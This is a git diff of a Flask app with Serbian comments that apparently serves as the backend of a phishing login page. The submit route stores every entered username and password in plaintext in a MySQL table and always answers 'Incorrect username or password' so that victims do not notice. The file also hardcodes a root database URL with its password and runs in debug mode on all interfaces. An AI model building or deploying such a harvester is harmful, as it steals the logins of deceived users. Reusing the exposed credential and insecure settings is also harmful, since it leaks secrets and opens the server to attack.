@@ -5,12 +5,11 @@ from sqlalchemy import text
 
 app = Flask(__name__)
 
-# ✅ Railway MySQL povezivanje
+# ✅ Povezivanje sa Railway bazom (koristi ENV varijablu ako postoji)
 DATABASE_URL = os.getenv('DATABASE_URL', 'mysql+pymysql://root:aiBzbPEEvtrurGaPrXjVZWgdVDjgABbt@maglev.proxy.rlwy.net:50172/railway')
 app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 app.secret_key = os.urandom(24)
-app.config['SQLALCHEMY_ENGINE_OPTIONS'] = {'pool_pre_ping': True}
 
 # ✅ Inicijalizacija baze
 db = SQLAlchemy(app)
@@ -20,24 +19,24 @@ class LoginAttempt(db.Model):
     username = db.Column(db.String(150), nullable=False)
     password = db.Column(db.String(150), nullable=False)
 
+# ✅ Kreiranje tabele
 with app.app_context():
     try:
-        # ✅ Provera konekcije
         with db.engine.connect() as connection:
             result = connection.execute(text('SELECT 1'))
-            print(f"✅ Konekcija uspešna: {result.fetchone()}")
+            print(f"✅ Konekcija sa bazom uspešna: {result.fetchone()}")
         
         db.create_all()
-        print("✅ Baza podataka je povezana i tabele su kreirane!")
+        print("✅ Tabela je kreirana!")
     except Exception as e:
-        print(f"❌ GREŠKA pri povezivanju na bazu: {e}")
+        print(f"❌ Greška pri povezivanju sa bazom: {e}")
 
-# ✅ Prikaz početne strane
+# ✅ Index stranica
 @app.route('/')
 def index():
     return render_template('index.html', message=None)
 
-# ✅ Obrada unosa iz login forme
+# ✅ Login ruta
 @app.route('/submit', methods=['POST'])
 def submit():
     username = request.form.get('username')
@@ -54,10 +53,10 @@ def submit():
         print(f"✅ Podaci sačuvani: {username}")
     except Exception as e:
         db.session.rollback()
-        print(f"❌ GREŠKA pri upisu u bazu: {e}")
+        print(f"❌ Greška pri upisu u bazu: {e}")
 
     return render_template('index.html', message="Incorrect username or password.")
 
 if __name__ == '__main__':
-    print("DATABASE URL:", app.config['SQLALCHEMY_DATABASE_URI'])
-    app.run(host="0.0.0.0", port=10000, debug=True)
+    port = int(os.environ.get("PORT", 8080))  # ✅ Railway PORT
+    app.run(host="0.0.0.0", port=port, debug=True)
